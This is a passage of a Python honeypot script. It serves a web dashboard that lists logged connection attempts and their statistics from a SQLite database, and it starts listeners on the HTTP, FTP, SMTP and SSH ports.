        function updateStats(stats) {
            document.getElementById('totalAttacks').textContent = stats.totalAttacks;
            document.getElementById('uniqueIPs').textContent = stats.uniqueIPs;
            document.getElementById('topService').textContent = stats.topService;
            document.getElementById('latestAttack').textContent = stats.latestAttack;
        }
        
        // Render attack table with pagination
        function renderAttackTable() {
            const tableBody = document.getElementById('attacksTableBody');
            tableBody.innerHTML = '';
            
            const startIndex = (currentPage - 1) * itemsPerPage;
            const endIndex = startIndex + itemsPerPage;
            const pageAttacks = filteredAttacks.slice(startIndex, endIndex);
            
            pageAttacks.forEach(attack => {
                const row = document.createElement('tr');
                
                // Format the timestamp
                const timestamp = new Date(attack.timestamp);
                const formattedTime = timestamp.toLocaleString();
                
                // Create table cells
                const payloadCell = createPayloadCell(attack.payload || '');
                
                row.innerHTML = `
                    <td>${formattedTime}</td>
                    <td>${attack.ip}</td>
                    <td>${attack.service}</td>
                    <td>${attack.exploit}</td>
                `;
                
                const tdPayload = document.createElement('td');
                tdPayload.appendChild(payloadCell);
                row.appendChild(tdPayload);
                
                tableBody.appendChild(row);
            });
            
            // Update pagination info
            document.getElementById('pageInfo').textContent = `Page ${currentPage} of ${Math.ceil(filteredAttacks.length / itemsPerPage) || 1}`;
            
            // Enable/disable pagination buttons
            document.getElementById('prevPage').disabled = currentPage === 1;
            document.getElementById('nextPage').disabled = currentPage >= Math.ceil(filteredAttacks.length / itemsPerPage);
            
            // Add event listeners for payload toggles
            addPayloadToggleListeners();
        }
        
        // Create a payload cell with toggle functionality
        function createPayloadCell(payload) {
            const container = document.createElement('div');
            container.className = 'payload-cell';
            
            const payloadContent = document.createElement('div');
            payloadContent.className = 'payload-content';
            payloadContent.textContent = payload;
            
            const toggle = document.createElement('span');
            toggle.className = 'payload-toggle';
            
            container.appendChild(payloadContent);
            container.appendChild(toggle);
            
            // Determine if payload is long enough to need toggle
            if (payload.length > 200) {
                container.classList.add('long-payload', 'payload-collapsed');
            }
            
            return container;
        }
        
        // Add event listeners to payload toggles
        function addPayloadToggleListeners() {
            document.querySelectorAll('.payload-toggle').forEach(toggle => {
                toggle.addEventListener('click', function() {
                    const container = this.parentElement;
                    if (container.classList.contains('payload-collapsed')) {
                        container.classList.remove('payload-collapsed');
                        container.classList.add('payload-expanded');
                    } else {
                        container.classList.remove('payload-expanded');
                        container.classList.add('payload-collapsed');
                    }
                });
            });
        }
        
        // Handle refresh button click
        document.getElementById('refreshBtn').addEventListener('click', () => {
            loadAttackData();
        });
        
        // Handle pagination
        document.getElementById('prevPage').addEventListener('click', () => {
            if (currentPage > 1) {
                currentPage--;
                renderAttackTable();
            }
        });
        
        document.getElementById('nextPage').addEventListener('click', () => {
            if (currentPage < Math.ceil(filteredAttacks.length / itemsPerPage)) {
                currentPage++;
                renderAttackTable();
            }
        });
        
        // Initialize the dashboard
        document.addEventListener('DOMContentLoaded', () => {
            loadAttackData();
            
            // Set up auto-refresh every 5 seconds
            setInterval(() => loadAttackData(), 5000);
        });
    </script>
</body>
</html>
"""

# Dashboard server handler
# Server handler with logo support
class DashboardHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        
        # Handle API requests
        if path == "/api/attacks":
            self.handle_api_attacks()
        # Serve logo
        elif path == "/api/logo":
            self.serve_logo()
        # Serve dashboard HTML
        elif path == "/" or path == "/dashboard":
            self.serve_dashboard()
        else:
            self.send_error(404, "Not Found")
    
    def serve_dashboard(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(DASHBOARD_HTML.encode())
    
    def serve_logo(self):
        try:
            logo_path = "logo.png"  # Place your logo file in the same directory as the script
            
            # If logo file exists, serve it
            if os.path.exists(logo_path):
                self.send_response(200)
                self.send_header("Content-type", "image/png")
                with open(logo_path, 'rb') as f:
                    logo_data = f.read()
                    self.send_header("Content-Length", str(len(logo_data)))
                    self.end_headers()
                    self.wfile.write(logo_data)
            else:
                # If no logo file, serve a placeholder
                self.send_response(200)
                self.send_header("Content-type", "image/svg+xml")
                self.end_headers()
                
                # Simple SVG placeholder logo
                svg_logo = f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
                    <rect width="100" height="100" fill="#3498db" rx="10" ry="10"/>
                    <text x="50" y="50" font-family="Arial" font-size="14" fill="white" text-anchor="middle" dominant-baseline="middle">PQC Honeypot</text>
                </svg>""".encode()
                
                self.wfile.write(svg_logo)
        except Exception as e:
            logging.error(f"[LOGO ERROR] {e}")
            self.send_error(500, str(e))
    
    def handle_api_attacks(self):
        try:
            # Connect to the database
            conn = sqlite3.connect("honeypot.db")
            cursor = conn.cursor()
            
            # Get all attacks ordered by timestamp descending
            sql = "SELECT id, timestamp, ip, service, payload, exploit FROM attacks ORDER BY timestamp DESC"
            
            # Execute the query
            cursor.execute(sql)
            attacks = cursor.fetchall()
            
            # Get statistics
            stats = self.get_attack_stats(cursor)
            
            # Process attacks data (without location information)
            attack_data = []
            for attack in attacks:
                attack_data.append({
                    "id": attack[0],
                    "timestamp": attack[1],
                    "ip": attack[2],
                    "service": attack[3],
                    "payload": attack[4],
                    "exploit": attack[5]
                })
            
            # Send JSON response
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            
            response = {
                "attacks": attack_data,
                "stats": stats
            }
            
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            logging.error(f"[DASHBOARD API ERROR] {e}")
            self.send_error(500, str(e))
        finally:
            if conn:
                conn.close()
    
    def get_attack_stats(self, cursor):
        try:
            # Total attacks
            cursor.execute("SELECT COUNT(*) FROM attacks")
            total_attacks = cursor.fetchone()[0]
            
            # Unique IPs
            cursor.execute("SELECT COUNT(DISTINCT ip) FROM attacks")
            unique_ips = cursor.fetchone()[0]
            
            # Top service
            cursor.execute("""
                SELECT service, COUNT(*) as count 
                FROM attacks 
                GROUP BY service 
                ORDER BY count DESC 
                LIMIT 1
            """)
            top_service_result = cursor.fetchone()
            top_service = top_service_result[0] if top_service_result else "None"
            
            # Latest attack time
            cursor.execute("SELECT timestamp FROM attacks ORDER BY timestamp DESC LIMIT 1")
            latest_result = cursor.fetchone()
            latest_attack = latest_result[0] if latest_result else "None"
            
            return {
                "totalAttacks": total_attacks,
                "uniqueIPs": unique_ips,
                "topService": top_service,
                "latestAttack": latest_attack
            }
        except Exception as e:
            logging.error(f"[DASHBOARD STATS ERROR] {e}")
            return {
                "totalAttacks": 0,
                "uniqueIPs": 0,
                "topService": "Unknown",
                "latestAttack": "Unknown"
            }

# Start the dashboard HTTP server
def start_dashboard(port=8080):
    try:
        server = HTTPServer(("0.0.0.0", port), DashboardHandler)
        logging.info(f"[*] Dashboard listening on port {port}")
        server.serve_forever()
    except Exception as e:
        logging.error(f"[DASHBOARD ERROR] Port {port} failed: {e}")


# Function to Start Services
def start_service(port, service_handler):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(5)
        logging.info(f"[*] {service_handler.__name__.split('_')[1].upper()} listening on port {port}")

        while True:
            client_socket, client_address = server.accept()
            logging.info(f"[+] {client_address[0]} connected on port {port}")
            threading.Thread(target=service_handler, args=(client_socket, client_address)).start()
    except Exception as e:
        logging.error(f"[ERROR] Port {port} failed: {e}")

# Start Multiple Services
services = {
    80: handle_http,
    21: handle_ftp,
    25: handle_smtp,
    22: handle_ssh
}

for port, handler in services.items():
    threading.Thread(target=start_service, args=(port, handler)).start()
    
# At the end of the file, add this line to start the dashboard server:
threading.Thread(target=start_dashboard, args=(8080,)).start()